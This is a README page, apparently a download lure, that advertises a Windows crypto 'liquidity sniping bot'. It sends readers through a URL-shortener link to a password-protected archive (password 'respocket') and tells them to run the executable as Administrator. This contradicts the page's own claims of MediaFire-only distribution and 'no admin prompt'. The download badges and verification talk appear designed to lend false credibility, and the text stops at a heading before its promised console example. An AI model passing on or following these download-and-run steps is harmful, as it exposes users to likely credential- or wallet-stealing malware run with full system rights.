<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# 🔥 Liquidity Sniping Bot — PC Windows

A DEX liquidity sniper — is a Windows desktop app that watches the mempool for new pool creations and fires a buy in the same or next block, instead of you refreshing a chart after the launch tweet. This repo documents the installer side of it rather than the strategy: build number and compile date, Authenticode signer, SHA-256, x64 and ARM64 packages kept in separate lanes, silent flags, the per-user install path under `%LOCALAPPDATA%`, the strategy profile under `%APPDATA%`, and the previous build number kept for rollback. Windows 10/11, no admin prompt, no browser extension, private key never in plaintext.

---

## ✨ What's inside

🪟 **Version stamp first** — build number and compile date printed in the header before a byte moves. If a page can't tell you the build, it's a wrapper, not a source.

🔐 **Signature check** — Authenticode subject is shown and expected to match the publisher cert. An unsigned bot from a mirror is a guess with a file size.

🧮 **SHA-256 line** — hash published next to the build so a downloaded file can be verified with `certutil -hashfile`. Mismatch means re-download, not "probably fine".

🧱 **Arch split** — x64 and ARM64 kept separate. The hot path is the socket and the signer; an ARM64 build on an x64 box emulates both and adds latency where latency is the product.

📁 **Install paths on the table** — per-user install under `%LOCALAPPDATA%\LiqSniper`, profile and encrypted keystore under `%APPDATA%\LiqSniper`, logs under `%APPDATA%\LiqSniper\logs`. No admin prompt, no `Program Files` surprise.

⚙️ **Silent install flags** — `/S` for the EXE path and `Add-AppxPackage` for the MSIX path, plus the headless form `sniper.exe --headless --profile default`, all written out, all without a GUI step.

🔌 **Profile location** — `%APPDATA%\LiqSniper\config.json`, with a working skeleton for RPC, WebSocket, router, size, slippage and exits, so nothing fires that you didn't set.

💾 **Keystore, not a text file** — the key is AES-sealed in `%APPDATA%\LiqSniper\keystore.json`, unlocked per session. A bot that stores a raw private key is one `.txt` away from a drain.

♻️ **Rollback line** — the previous build number kept in the profile. A release that mis-prices gas or drops the WS reconnect should have a way back.

---

## 🏅 How the entries read

| Tier | Meaning |
| --- | --- |
| **S** | decides whether you have the real package — signature, SHA-256, keystore handling |
| **A** | decides whether it fires cleanly — arch split, RPC/WS config, gas and slippage fields |
| **B** | useful after the fact — profile path, log line, rollback number |
| **Noise** | on every wrapper page, proves nothing — "10x guaranteed", countdown timers, "fast servers" |

---

## 🧪 Live example — one verify, one snipe, one honest log

What the console prints on a real run:
